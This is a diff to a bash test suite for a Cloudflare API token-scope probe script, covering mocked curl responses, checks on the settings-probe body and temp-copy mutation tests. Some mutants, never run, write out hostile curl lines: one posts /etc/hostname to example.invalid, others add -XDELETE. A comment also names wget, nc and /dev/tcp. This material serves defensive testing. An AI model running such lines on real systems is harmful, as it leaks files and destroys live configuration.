@@ -124,10 +124,15 @@ done
 # per-scheme body-shape check is exercised against the true contract (#6892 QA).
 ZONE_AUTH='200:{"success":true,"result":{"id":"r","kind":"zone","phase":"p","rules":[]}}'
 ACCT_AUTH='200:{"success":true,"result":[]}'
+# Zone settings list: a real zone always lists settings, so an authorized EMPTY
+# list is degraded (the collision guard must never pass on it vacuously).
+ZSET_AUTH='200:{"success":true,"result":[{"id":"ssl","value":"full"},{"id":"always_use_https","value":"on"}]}'
 # WRITE requests (migration profiles). Logged as "METHOD URL TOKEN BODY". The
 # default answer models Cloudflare: a token that holds the URL's scope gets 400
 # for the invalid body, any other token 403. MOCK_WRITE_OVERRIDE is a file of
 # "<url-regex>|<token>|<code>:<body>" lines; the first match wins.
+# Evaluation order: the override, then the zone settings endpoint's JSON-first
+# parse, then the token default.
 if [[ "$method" != "GET" ]]; then
   [[ -n "${MOCK_WRITE_LOG:-}" ]] && printf '%s %s %s %s\n' "$method" "$url" "$tok" "$body_arg" >>"$MOCK_WRITE_LOG"
   spec=""
@@ -136,6 +141,14 @@ if [[ "$method" != "GET" ]]; then
       [[ -n "$o_re" ]] || continue
       if [[ "$url" =~ $o_re && "$tok" == "$o_tok" ]]; then spec="$o_spec"; break; fi
     done <"$MOCK_WRITE_OVERRIDE"
+  fi
+  # PATCH /zones/<z>/settings parses JSON BEFORE it checks authorization
+  # (measured 2026-11-26, #12931 comment 7193905571): a non-JSON body gets 400
+  # code 6007 for EVERY token, and valid JSON from a denied token gets 403 code
+  # 9109. The grant token's 400 on the JSON probe body is ASSUMED here: it is not
+  # measured until the post-merge staged run records it.
+  if [[ -z "$spec" && "$url" =~ /zones/[^/]+/settings$ ]] && ! printf '%s' "$body_arg" | jq -e . >/dev/null 2>&1; then
+    spec='400:{"success":false,"errors":[{"code":6007,"message":"Malformed JSON in request body"}]}'
   fi
   if [[ -z "$spec" ]]; then
     base_tok="${tok%-next}"
@@ -148,6 +161,7 @@ if [[ "$method" != "GET" ]]; then
       tok-botmgmt-mock)      [[ "$url" =~ /bot_management$ ]] && granted=1 ;;
     esac
     if [[ "$granted" == 1 ]]; then spec='400:{"success":false,"errors":[{"code":10026,"message":"invalid json"}]}'
+    elif [[ "$url" =~ /zones/[^/]+/settings$ ]]; then spec='403:{"success":false,"errors":[{"code":9109,"message":"Unauthorized to access requested resource"}]}'
     else spec='403:{"success":false,"errors":[{"code":10000,"message":"Authentication error"}]}'; fi
   fi
   printf '%s\n%s' "${spec#*:}" "${spec%%:*}"
@@ -169,7 +183,7 @@ case "$url" in
   *cfd_tunnel*)                    spec="${MOCK_TUNNEL:-$ACCT_AUTH}" ;;
   *access/apps*)                   spec="${MOCK_ACCESS:-$ACCT_AUTH}" ;;
   *dns_records*)                   spec="${MOCK_DNS:-$ACCT_AUTH}" ;;
-  */settings)                      spec="${MOCK_ZSET:-$ACCT_AUTH}" ;;
+  */settings)                      spec="${MOCK_ZSET:-$ZSET_AUTH}" ;;
   *load_balancers/pools*)          spec="${MOCK_LB_POOLS:-$ACCT_AUTH}" ;;
   *load_balancers*)                spec="${MOCK_LB_ZONE:-$ACCT_AUTH}" ;;
   */rulesets)                      spec="${MOCK_ACCT:-$ACCT_AUTH}" ;;
@@ -836,8 +850,10 @@ src_lacks 'DELETE\|' "D12 no DELETE row in any migration table"
 #   (F) a LINT of D12C_CANON, not an independent check of the script: every
 #       canonical form uses only the read flags --disable --noproxy -sS
 #       --max-time -w -H, plus -X and --data-binary as a PAIR: -X takes only the
-#       table variable ("$method" / $w_method) and the one body is exactly
-#       --data-binary "$INVALID_BODY". (I) makes the script's curl lines equal
+#       table variable ("$method" / $w_method) and the one body word is exactly
+#       "$w_body", which mig_req's closed body-kind case sets only from the two
+#       readonly literals INVALID_BODY and SETTINGS_PROBE_BODY (the w_body
+#       write-form set below pins that). (I) makes the script's curl lines equal
 #       to D12C_CANON, so (F) on the canon covers the script; its mutants are
 #       applied to a copy of D12C_CANON.
 #   (U) the curl mock refuses any flag it does not model (logs UNMODELLED, exit
@@ -862,7 +878,8 @@ src_lacks 'DELETE\|' "D12 no DELETE row in any migration table"
 #     printed verbatim, so a curl there reds (I) unless it replaces a canonical
 #     line exactly;
 #   - non-curl HTTP clients (wget, nc, /dev/tcp, a python/node/perl runtime);
-#   - the VALUES of $method and $INVALID_BODY (pinned by D12, M0, M1 and the
+#   - the VALUES of $method and of the two body literals (pinned by D12, M0,
+#     M0s, M1, M2 and the
 #     SUT's own table tripwire, not here); curl behaviour from outside argv (the
 #     canonical forms carry --disable and --noproxy '*', nothing more); and
 #     whether a canonical form is itself safe, which is the review that accepted
@@ -870,6 +887,14 @@ src_lacks 'DELETE\|' "D12 no DELETE row in any migration table"
 #     Its lines are bash's own printing of the reviewed source (measured equal on
 #     bash 5.2.21, Ubuntu 24.04, and 5.3.20), so a printing change in a future
 #     bash reds (I) and is reviewed, never silently admitted.
+# Body constants and the D12c write anchor, at ONE site (M0/M0s/M1/M2/M10 read the
+# bodies; D12c reads the anchor). WANT_SET_BODY is hardcoded: the one anchor that
+# does not come from the script, so a change to the probe body edits two files.
+INV_BODY="$(sed -n "s/^readonly INVALID_BODY='\(.*\)'$/\1/p" "$SUT" | head -1)"
+SET_BODY="$(sed -n "s/^readonly SETTINGS_PROBE_BODY='\(.*\)'$/\1/p" "$SUT" | head -1)"
+WANT_SET_BODY='{"items":[{"id":"cf_token_scope_probe_nonexistent_setting","value":"cf_token_scope_probe_never_valid"}]}'
+# shellcheck disable=SC2016  # literal source text is the anchor
+D12C_WRITE_ANCHOR='--data-binary "$w_body"'
 # The flag allowlist (F). Input: one canonical line per row. Prints each offending row.
 D12C_FLAGS="$WORK/d12c-flags.awk"
 cat >"$D12C_FLAGS" <<'AWK'
@@ -883,7 +908,7 @@ $0 ~ /^unset [A-Z_ ]+$/ { next }
     if (w[k] !~ /^-/) continue
     if (w[k] ~ /^(--disable|--noproxy|-sS|--max-time|-w|-H)$/) continue
     if (w[k] == "-X") { nx++; if (w[k + 1] != "\"$method\"" && w[k + 1] != "$w_method") bad = bad " -X<" w[k + 1] ">"; continue }
-    if (w[k] == "--data-binary") { nb++; if (w[k + 1] != "\"$INVALID_BODY\"") bad = bad " body<" w[k + 1] ">"; continue }
+    if (w[k] == "--data-binary") { nb++; if (w[k + 1] != "\"$w_body\"") bad = bad " body<" w[k + 1] ">"; continue }
     bad = bad " flag<" w[k] ">"
   }
   if (nx > 1 || nb > 1 || nx != nb) bad = bad " -X/--data-binary not exactly one pair (" nx "/" nb ")"
@@ -895,14 +920,14 @@ D12C_CANON="$WORK/d12c-canon.txt"
 cat >"$D12C_CANON" <<'CANON'
 unset SSLKEYLOGFILE CURL_CA_BUNDLE SSL_CERT_FILE SSL_CERT_DIR CURL_HOME HOSTALIASES LOCALDOMAIN RES_OPTIONS
 [[ -n "$c_label" ]] || continue; printf '%s\n' "# control $c_label (want 200, success:true, .result $c_want)"; printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$$(mig_key "$c_key")\") $(mig_url "$c_url")";
-printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -X $w_method -H 'Content-Type: application/json' --data-binary \"\$INVALID_BODY\" -H @<(printf 'Authorization: Bearer %s' \"\$$(mig_key "$w_key")\") $(mig_url "$w_url")";
+printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -X $w_method -H 'Content-Type: application/json' --data-binary \"\$w_body\" -H @<(printf 'Authorization: Bearer %s' \"\$$(mig_key "$w_key")\") $(mig_url "$w_url")";
 IFS='|' read -r r_class r_label r_url r_want r_scheme <<< "$row"; printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $r_url";
 printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $API/zones/\$ZONE/rulesets/phases/$p/entrypoint";
 done; printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $API/accounts/\$ACCT/rulesets"; exit 0;
 for bin in curl doppler jq;
 resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -H @<(printf 'Authorization: Bearer %s' "$TOK") "$url" 2> /dev/null || true)";
 resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -H @<(printf 'Authorization: Bearer %s' "${MIG_TOK[$key]}") "$url" 2> /dev/null || true)"
-resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -X "$method" -H 'Content-Type: application/json' --data-binary "$INVALID_BODY" -H @<(printf 'Authorization: Bearer %s' "${MIG_TOK[$key]}") "$url" 2> /dev/null || true)"
+resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -X "$method" -H 'Content-Type: application/json' --data-binary "$w_body" -H @<(printf 'Authorization: Bearer %s' "${MIG_TOK[$key]}") "$url" 2> /dev/null || true)"
 CANON
 # d12c_check <script> <I|S> [bash]: prints nothing when the curl-naming lines of
 # bash's parse of <script> equal D12C_CANON as a multiset (S: both sides with every
@@ -934,14 +959,30 @@ if [[ -z "$d12c_out" ]]; then ok "D12c (S) the same holds with every ' \" \\ del
 d12c_fl_canon="$(awk -f "$D12C_FLAGS" "$D12C_CANON")"
 if [[ -z "$d12c_fl_canon" ]]; then ok "D12c (F) the canonical forms pass the flag allowlist"; else no "D12c (F) a canonical form breaks the allowlist: $d12c_fl_canon"; fi
 # shellcheck disable=SC2016  # literal source text is the assertion
-assert_eq "D12c the run path sends INVALID_BODY from exactly one curl site" 1 "$(grep -cF -- '--data-binary "$INVALID_BODY"' "$SUT" || true)"
+assert_eq "D12c the run path sends the write body from exactly one curl site" 1 "$(grep -cF -- "$D12C_WRITE_ANCHOR" "$SUT" || true)"
+# The w_body WRITE forms over bash's parse: exactly the local declaration with no
+# initializer and the two closed-case assignments. A plain ^w_body= count would
+# miss `local w_body=…`, `read … w_body`, `printf -v w_body` and `w_body+=`.
+wbody_set() {
+  env -i PATH=/var/empty "$BASHBIN" --pretty-print "$1" 2>/dev/null \
+    | awk '{ sub(/^[ \t]+/, ""); sub(/[ \t]+$/, "") }
+           /^printf / { next }
+           /local[^;]*[^A-Za-z0-9_]w_body([^A-Za-z0-9_]|$)|^w_body\+?=|read[^;]*[^A-Za-z0-9_]w_body([^A-Za-z0-9_]|$)|printf -v w_body|declare[^;]*[^A-Za-z0-9_]w_body([^A-Za-z0-9_]|$)/' \
+    | LC_ALL=C sort
+}
+WBODY_WANT="$WORK/wbody-want.txt"
+# shellcheck disable=SC2016  # literal source text is the assertion
+printf '%s\n' 'local w_body;' 'w_body="$INVALID_BODY"' 'w_body="$SETTINGS_PROBE_BODY"' | LC_ALL=C sort >"$WBODY_WANT"
+if diff "$WBODY_WANT" <(wbody_set "$SUT") >/dev/null; then
+  ok "D12c w_body is written only by its bare local declaration and the two closed-case literal assignments"
+else
+  no "D12c w_body write forms differ from the reviewed three: $(wbody_set "$SUT" | tr '\n' '|')"
+fi
 
 # Mutants of the SCRIPT, each applied to a temp COPY (never the live tree) and
 # never executed. Each row asserts the layer that must red it, for its own reason:
 # I = the parse succeeds and its curl lines differ from the canon; S = the same on
 # the stripped copy; P = --pretty-print exits non-zero.
-# shellcheck disable=SC2016  # literal source text is the assertion
-D12C_WRITE_ANCHOR='--data-binary "$INVALID_BODY"'
 D12C_GET_ANCHOR="-sS --max-time 15 -w '\n%{http_code}' \\"
 D12C_FN_ANCHOR=$'    *)             printf \'\' ;;\n  esac\n'
 # d12c_mut <layer I|S|P> <label> <anchor> <replacement> | <layer> <label> APPEND <line>
@@ -965,6 +1006,7 @@ d12c_mut() {
 d12c_mut I '-XDELETE -d@/dev/null on the write probe' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -XDELETE -d@/dev/null"
 d12c_mut I '-d"$X" beside the invalid body' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -d\"\$X\""
 d12c_mut I 'a second body flag (--data-raw "$INVALID_BODY_V2")' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR --data-raw \"\$INVALID_BODY_V2\""
+d12c_mut I 'curl site back to --data-binary "$INVALID_BODY" (Guard 1 #8)' "$D12C_WRITE_ANCHOR" '--data-binary "$INVALID_BODY"'
 d12c_mut I '-X "DELETE" in place of the table method' '-X "$method"' '-X "DELETE"'
 d12c_mut I '-XDELETE on a read probe (no body)' "$D12C_GET_ANCHOR" "-sS -XDELETE --max-time 15 -w '\n%{http_code}' \\"
 d12c_mut I 'a new curl line hiding behind "# INVALID_BODY"' APPEND 'curl -sS -d @/etc/hostname https://example.invalid # INVALID_BODY'
@@ -1002,7 +1044,15 @@ d12c_fmut() {
 {
 d12c_fmut '-XDELETE -d@/dev/null on the write probe' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -XDELETE -d@/dev/null"
 d12c_fmut 'a new curl line with -d @/etc/hostname' APPEND 'curl -sS -d @/etc/hostname https://example.invalid'
+d12c_fmut 'the body word back to "$INVALID_BODY" (Guard 1 #8)' "$D12C_WRITE_ANCHOR" '--data-binary "$INVALID_BODY"'
 }
+# Guard 1 #7: a third w_body assignment reds the write-form set (temp copy, never run).
+# shellcheck disable=SC2016  # literal source text is the assertion
+printf '%s\n%s\n' "$(cat "$SUT")" 'w_body="$X"' >"$WORK/wbody-mut.sh"
+if diff "$WBODY_WANT" <(wbody_set "$WORK/wbody-mut.sh") >/dev/null; then no "MUT D12c a third w_body= assignment survives the write-form set"; else ok "MUT D12c a third w_body= assignment reds the write-form set"; fi
+# shellcheck disable=SC2016  # literal source text is the assertion
+printf '%s\n%s\n' "$(cat "$SUT")" 'f() { local w_body="$X"; }' >"$WORK/wbody-mut.sh"
+if diff "$WBODY_WANT" <(wbody_set "$WORK/wbody-mut.sh") >/dev/null; then no "MUT D12c a local w_body=… initializer survives the write-form set"; else ok "MUT D12c a local w_body=… initializer reds the write-form set"; fi
 # Negative controls: a non-curl line that tripped the old spelling list (grep -qF,
 # sort -T, [[ -d) and a whole-line comment naming curl (bash drops it) stay green.
 printf '%s\n%s\n' "$(cat "$SUT")" '[[ -d /tmp ]] && sort -T /tmp </dev/null >/dev/null; grep -qF -- x /dev/null || true' >"$WORK/d12c-mut.sh"
@@ -1049,16 +1099,73 @@ src_has 'is neither retained nor target' "D12d class-validation tripwire present
 # invalid-body write probes, deny-control-first, 2xx is fatal with a read-back.
 NEW_ACCT="66d4f93f7397f196544e9fe84c3557c2"
 NEW_ZONE="951ce525552201ec6c696b24251abed7"
-INV_BODY="$(sed -n "s/^readonly INVALID_BODY='\(.*\)'$/\1/p" "$SUT" | head -1)"
 MWLOG="$WORK/m-writes.log"
 MGLOG="$WORK/m-gets.log"
 mrun() { : >"$MWLOG"; : >"$MGLOG"; MOCK_WRITE_LOG="$MWLOG" MOCK_GET_LOG="$MGLOG" run "$MOCKPATH" "$@"; }
+# run_script <script> <PATH> <args…>: run() for a temp copy (run() hardcodes $SUT).
+run_script() { local script="$1" path="$2"; shift 2; PATH="$path" "$BASHBIN" "$script" "$@" >"$OUTFILE" 2>&1; RC=$?; }
+MUT_DLOG="$WORK/mut-doppler.log"
+MUT_ARGS=(--profile zone-rest)
+MUT_N=0
+# run_mut <label> <want-exit> <want-writes> <want-doppler-reads> <want-message> <anchor> <replacement> [<anchor> <replacement>…]
+# Applies each pair to a temp COPY of the script (never the live tree), refusing a
+# vacuous mutant (an anchor that is not a whole line of the source, or a
+# replacement that does not occur exactly once in the copy) and a copy that does
+# not parse (bash exits 2 on a syntax error, which would satisfy every exit-2 row
+# with zero writes). Then RUNS the copy through the mock with "${MUT_ARGS[@]}" and
+# fresh write/GET/Doppler logs. Always emits exactly 5 assertions.
+run_mut() {
+  local label="$1" want_rc="$2" want_w="$3" want_d="$4" want_msg="$5" src copy anchor repl rest bad=""
+  shift 5
+  MUT_N=$((MUT_N + 1)); copy="$WORK/run-mut-$MUT_N.sh"
+  src="$(cat "$SUT")"
+  while [[ $# -ge 2 ]]; do
+    anchor="$1"; repl="$2"; shift 2
+    if [[ $'\n'"$src"$'\n' != *$'\n'"$anchor"$'\n'* ]]; then bad+=" anchor-not-a-source-line<${anchor:0:70}>"; continue; fi
+    src="${src/"$anchor"/"$repl"}"
+    if [[ -n "$repl" ]]; then
+      rest="${src#*"$repl"}"
+      [[ "$src" == *"$repl"* && "$rest" != *"$repl"* ]] || bad+=" replacement-not-exactly-once<${repl:0:70}>"
+    fi
+  done
+  printf '%s\n' "$src" >"$copy"
+  "$BASHBIN" -n "$copy" 2>/dev/null || bad+=" copy-does-not-parse"
+  : >"$MWLOG"; : >"$MGLOG"; : >"$MUT_DLOG"
+  MOCK_WRITE_LOG="$MWLOG" MOCK_GET_LOG="$MGLOG" MOCK_DOPPLER_MARKER="$MUT_DLOG" run_script "$copy" "$MOCKPATH" "${MUT_ARGS[@]}"
+  if [[ -z "$bad" ]]; then ok "MUT $label: mutant applied (whole-line anchors, parses)"; else no "MUT $label: vacuous or broken mutant:$bad"; fi
+  assert_rc "$want_rc" "MUT $label: exit"
+  assert_eq "MUT $label: write requests" "$want_w" "$(wc -l <"$MWLOG" | tr -d '[:space:]')"
+  assert_eq "MUT $label: Doppler reads" "$want_d" "$(wc -l <"$MUT_DLOG" | tr -d '[:space:]')"
+  has "$want_msg" "MUT $label: message"
+}
 
 # --- M0: the body literal itself (L49): present, not JSON, never the wipe body ---
 if [[ -n "$INV_BODY" ]]; then ok "M0 INVALID_BODY literal parsed from source (positive control)"; else no "M0 INVALID_BODY literal not found"; fi
 if printf '%s' "$INV_BODY" | "$JQBIN" -e . >/dev/null 2>&1; then no "M0 INVALID_BODY parses as JSON — it could validate"; else ok "M0 INVALID_BODY is not JSON, so no endpoint can validate it"; fi
 src_lacks '"rules"[[:space:]]*:[[:space:]]*\[[[:space:]]*\]' 'M0 no {"rules":[]} body anywhere in source (it would wipe a live entrypoint)'
 src_has 'INVALID_BODY parses as JSON' "M0 runtime JSON tripwire present in source"
+
+# --- M0s / M0h: the settings probe literal (L49 rule 1, Guard 2) ---
+if [[ -n "$SET_BODY" ]]; then ok "M0s SETTINGS_PROBE_BODY literal parsed from source (positive control)"; else no "M0s SETTINGS_PROBE_BODY literal not found"; fi
+if printf '%s' "$SET_BODY" | "$JQBIN" -e 'type == "object"' >/dev/null 2>&1; then ok "M0s SETTINGS_PROBE_BODY parses as a JSON object"; else no "M0s SETTINGS_PROBE_BODY does not parse as a JSON object"; fi
+if printf '%s' "$SET_BODY" | "$JQBIN" -e '(.items | type == "array" and length > 0) and all(.items[]; .id | type == "string" and startswith("cf_token_scope_probe_"))' >/dev/null 2>&1; then
+  ok "M0s every .items[].id starts with cf_token_scope_probe_"
+else
+  no "M0s an item id is not probe-prefixed, or items is empty"
+fi
+if printf '%s' "$SET_BODY" | "$JQBIN" -e '[.. | objects | has("rules")] | any' >/dev/null 2>&1; then no "M0s SETTINGS_PROBE_BODY carries a rules key"; else ok "M0s SETTINGS_PROBE_BODY carries no rules key"; fi
+assert_eq "M0h SETTINGS_PROBE_BODY equals the suite's hardcoded WANT_SET_BODY byte-for-byte" "$WANT_SET_BODY" "$SET_BODY"
+assert_eq "M0h the literal is declared exactly once" 1 "$(grep -cxF -- "readonly SETTINGS_PROBE_BODY='$WANT_SET_BODY'" "$SUT" || true)"
+
+# --- D-rows: every write row has 6 fields; exactly one settings-json row (AC2) ---
+MROWS="$WORK/m-rows.txt"
+awk '/^MIG_WRITE_(REDIRECTS_DNS|ZONE_REST)=\(/ {f=1; next} f && /^\)/ {f=0} f && /^[[:space:]]*"/ { sub(/^[[:space:]]*"/, ""); sub(/"[[:space:]]*$/, ""); print }' "$SUT" >"$MROWS"
+assert_eq "D-rows both write tables parsed" "$((MW_RD_N + MW_ZR_N))" "$(wc -l <"$MROWS" | tr -d '[:space:]')"
+assert_eq "D-rows every write row has exactly 6 |-separated fields" 0 "$(awk -F'|' 'NF != 6' "$MROWS" | wc -l | tr -d '[:space:]')"
+assert_eq "D-rows exactly one row's body-kind is settings-json" 1 "$(awk -F'|' '$6 == "settings-json"' "$MROWS" | wc -l | tr -d '[:space:]')"
+# shellcheck disable=SC2016  # the literal row text is the assertion
+assert_eq "D-rows the settings-json row is PATCH on the zone settings URL" 1 "$(U='$API/zones/\$ZONE/settings' awk -F'|' '$6 == "settings-json" && $2 == "PATCH" && $3 == ENVIRON["U"]' "$MROWS" | wc -l | tr -d '[:space:]')"
+assert_eq "D-rows every other row's body-kind is invalid" 0 "$(awk -F'|' '$6 != "settings-json" && $6 != "invalid"' "$MROWS" | wc -l | tr -d '[:space:]')"
 
 # --- M1: redirects-dns happy path ---
 mrun --profile redirects-dns
@@ -1097,6 +1204,19 @@ if grep -qE '^PATCH .*/zones/'"$NEW_ZONE"'/settings ' "$MWLOG" && grep -qE '^PUT
 else
   no "M2 zone-rest rows missing (see $MWLOG)"
 fi
+# Per-row bodies, counted (an empty or body-less log fails): the settings row
+# carries exactly SETTINGS_PROBE_BODY, the bot_management row exactly INVALID_BODY.
+m_body_n() { awk -v m="$1" -v u="$2" -v b="$3" '$1 == m && $2 ~ u { body = $0; sub(/^[^ ]+ [^ ]+ [^ ]+ /, "", body); if (body == b) c++ } END { print c + 0 }' "$MWLOG"; }
+assert_eq "M2 exactly 2 /settings PATCH probes carry SETTINGS_PROBE_BODY" 2 "$(m_body_n PATCH '/settings$' "$SET_BODY")"
+assert_eq "M2 exactly 2 /bot_management PUT probes carry INVALID_BODY" 2 "$(m_body_n PUT '/bot_management$' "$INV_BODY")"
+if [[ -s "$MWLOG" ]] && awk '!seen[$2]++ { if (($2 ~ /\/settings$/ && $3 != "tok-botmgmt-mock") || ($2 ~ /\/bot_management$/ && $3 != "tok-zonesettings-mock")) bad++ } END { exit bad > 0 }' "$MWLOG"; then
+  ok "M2 both rows probe the known-denied token first"
+else
+  no "M2 a grant token was probed before its deny control (see $MWLOG)"
+fi
+assert_eq "M2 the settings deny control sent the JSON probe body with the bot-management token" 1 "$(grep -cxF -- "PATCH https://api.cloudflare.com/client/v4/zones/$NEW_ZONE/settings tok-botmgmt-mock $SET_BODY" "$MWLOG" || true)"
+has_re 'zones/<zone>/settings +authorized \(PATCH 400 after a 403 control\)' "M2 the settings row reads authorized"
+for leak in tok-zonesettings-mock tok-botmgmt-mock; do lacks "$leak" "M2 output never carries token $leak"; done
 
 # --- M3: a grant token answering 403 -> verdict=denied, exit 3 ---
 MOV="$WORK/m-override.txt"
@@ -1143,6 +1263,16 @@ assert_rc 4 "M5c bot-management 2xx -> exit 4"
 lacks "PASS: no scope dropped" "M5c read-back redacts a verdict-looking string"
 has '"id":"<redacted>"' "M5c read-back shows the redaction marker"
 unset MOCK_OTHER
+
+# --- M5d: a 2xx on the settings grant probe -> exit 4 after a read-back (CTO dissent trigger) ---
+printf '%s\n' '/zones/[^/]+/settings$|tok-zonesettings-mock|200:{"success":true,"result":[]}' >"$MOV"
+MOCK_WRITE_OVERRIDE="$MOV" mrun --profile zone-rest
+assert_rc 4 "M5d settings grant 2xx -> exit 4"
+has "probe=zone-rest verdict=fatal-mutation" "M5d prints verdict=fatal-mutation"
+assert_eq "M5d the settings list was read with the grant token twice (control, then read-back)" 2 "$(grep -cxF -- "GET https://api.cloudflare.com/client/v4/zones/$NEW_ZONE/settings tok-zonesettings-mock" "$MGLOG" || true)"
+assert_eq "M5d the run aborted at the settings grant probe" 2 "$(wc -l <"$MWLOG" | tr -d '[:space:]')"
+has '"probe_id_listed":false' "M5d the read-back says whether a probe-prefixed id is listed"
+lacks "verdict=pass" "M5d no pass verdict"
 
 # --- M6: a degraded control -> inconclusive, and no audit is read from it ---
 MOCK_ACCT='200:{"success":false,"result":[]}' mrun --profile redirects-dns
@@ -1194,6 +1324,78 @@ run "$MOCKPATH" --profile zone-rest --zone-id 0000000000000000000000000000000a -
 assert_rc 0 "M9f a valid override id is accepted"
 has "zones/0000000000000000000000000000000a/settings" "M9f the override id reaches the probe URL"
 
+# --- M11a: the probe id listed on the zone -> exit 2 before any write (Guard 3) ---
+ZS_HIT1='200:{"success":true,"result":[{"id":"cf_token_scope_probe_nonexistent_setting","value":"x"},{"id":"ssl","value":"full"}]}'
+ZS_HIT2='200:{"success":true,"result":[{"id":"ssl","value":"full"},{"id":"cf_token_scope_probe_nonexistent_setting","value":"x"}]}'
+for zs in "$ZS_HIT1" "$ZS_HIT2"; do
+  MOCK_ZSET="$zs" mrun --profile zone-rest
+  assert_rc 2 "M11a a listed probe id -> exit 2"
+  assert_eq "M11a a listed probe id -> no write request" 0 "$(wc -l <"$MWLOG" | tr -d '[:space:]')"
+  has "a setting named like the probe id exists on this zone" "M11a names the collision"
+done
+MOCK_ZSET='200:{"success":true,"result":[{"id":"cf_token_scope_probe_nonexistent_setting_other","value":"x"},{"id":"ssl","value":"full"}]}' mrun --profile zone-rest
+assert_rc 0 "M11a a prefix-sharing id is not a collision (exact id match) -> exit 0"
+
+# --- M11g: an authorized EMPTY settings list is degraded, never a vacuous pass ---
+MOCK_ZSET='200:{"success":true,"result":[]}' mrun --profile zone-rest
+assert_rc 3 "M11g empty settings list -> exit 3"
+has "degraded (200 settings list empty)" "M11g reports the empty list as degraded"
+assert_eq "M11g no /settings write under an empty list" 0 "$(grep -c '/settings ' "$MWLOG" || true)"
+
+# --- M11e: settings control 404 -> the JSON row is skipped, the bot row is still probed ---
+MOCK_ZSET='404:{"success":false,"errors":[{"code":7003}]}' mrun --profile zone-rest
+assert_rc 3 "M11e settings control 404 -> exit 3"
+has "inconclusive (settings control not authorized" "M11e the settings row reads inconclusive"
+assert_eq "M11e no /settings write without the control" 0 "$(grep -c '/settings ' "$MWLOG" || true)"
+assert_eq "M11e the bot_management row is still probed" 2 "$(grep -c '/bot_management ' "$MWLOG" || true)"
+
+# --- M11 temp-copy mutants (Guard Contract rows; run_mut, never the live tree) ---
+# shellcheck disable=SC2016  # literal source lines are the anchors
+{
+ZR_SET_ROW='  "zones/<zone>/settings|PATCH|$API/zones/\$ZONE/settings|CF_API_TOKEN_ZONE_SETTINGS|CF_API_TOKEN_BOT_MANAGEMENT|settings-json"'
+ZR_BOT_ROW='  "zones/<zone>/bot_management|PUT|$API/zones/\$ZONE/bot_management|CF_API_TOKEN_BOT_MANAGEMENT|CF_API_TOKEN_ZONE_SETTINGS|invalid"'
+RD_ROW1='  "zones/<zone>/rulesets/phases/http_request_dynamic_redirect/entrypoint|PUT|$API/zones/\$ZONE/rulesets/phases/http_request_dynamic_redirect/entrypoint|CF_API_TOKEN_RULESETS|CF_API_TOKEN_PAGES|invalid"'
+SET_LIT_LINE="readonly SETTINGS_PROBE_BODY='$WANT_SET_BODY'"
+GUARD_LOOP_LINE='for mig_row in "${MIG_WRITE_REDIRECTS_DNS[@]}" "${MIG_WRITE_ZONE_REST[@]}"; do  # static-guard-rows'
+GUARD_JQ_LINE='     '"'"'type == "object" and keys == ["items"] and (.items | type == "array" and length > 0) and all(.items[]; type == "object" and keys == ["id","value"] and (.id | type == "string" and startswith("cf_token_scope_probe_")))'"'"' >/dev/null 2>&1; then'
+COLL_LINE='  printf '"'"'%s'"'"' "$MIG_SETTINGS_LIST" | jq -e --argjson body "$SETTINGS_PROBE_BODY" '"'"'. as $list | any($body.items[].id; . as $i | any($list.result[]?; .id? == $i))'"'"' >/dev/null 2>&1 || mig_rc=$?'
+COLL_NEVER_SET_LINE='  printf '"'"'%s'"'"' "${MIG_SETTINGS_NEVER_SET:-}" | jq -e --argjson body "$SETTINGS_PROBE_BODY" '"'"'. as $list | any($body.items[].id; . as $i | any($list.result[]?; .id? == $i))'"'"' >/dev/null 2>&1 || mig_rc=$?'
+set_lit() { printf "readonly SETTINGS_PROBE_BODY='%s'" "$1"; }
+MUT_ARGS=(--profile zone-rest)
+# Guard 1 (body selection closed and URL-scoped)
+run_mut "M11b bot_management row -> settings-json" 2 0 0 "off the zone settings PATCH" "$ZR_BOT_ROW" "${ZR_BOT_ROW%invalid\"}settings-json\""
+run_mut "M11b a third settings-json row on another URL" 2 0 0 "off the zone settings PATCH" "$ZR_BOT_ROW" "$ZR_BOT_ROW"$'\n''  "zones/<zone>/dns_records|POST|$API/zones/\$ZONE/dns_records|CF_API_TOKEN|CF_API_TOKEN_PAGES|settings-json"'
+run_mut "M11c an unknown body-kind on a redirects-dns row" 2 0 0 "not invalid or settings-json" "$RD_ROW1" "${RD_ROW1%invalid\"}bogus\""
+run_mut "M2w the settings row reverted to invalid (the live defect)" 3 3 2 "got 400, not 403" "$ZR_SET_ROW" "${ZR_SET_ROW%settings-json\"}invalid\""
+assert_eq "MUT M2w the settings grant is never probed after the 400 control" 0 "$(grep -c '/settings tok-zonesettings-mock ' "$MWLOG" || true)"
+run_mut "Guard 1 #6 the closed-case arms swapped" 3 3 2 "got 400, not 403" \
+  '        invalid) w_body="$INVALID_BODY" ;;' '        invalid) w_body="$SETTINGS_PROBE_BODY" ;;' \
+  '          w_body="$SETTINGS_PROBE_BODY" ;;' '          w_body="$INVALID_BODY" ;;'
+run_mut "Guard 1 dispatch: static guard loop emptied, bot row -> settings-json (only the mig_req chokepoint is left)" 2 2 2 "is not the zone settings URL" \
+  "$GUARD_LOOP_LINE" 'for mig_row in ; do  # static-guard-rows' "$ZR_BOT_ROW" "${ZR_BOT_ROW%invalid\"}settings-json\""
+run_mut "Guard 1 H2 zone-rest rows reordered (settings second) still pass" 0 4 2 "probe=zone-rest verdict=pass" \
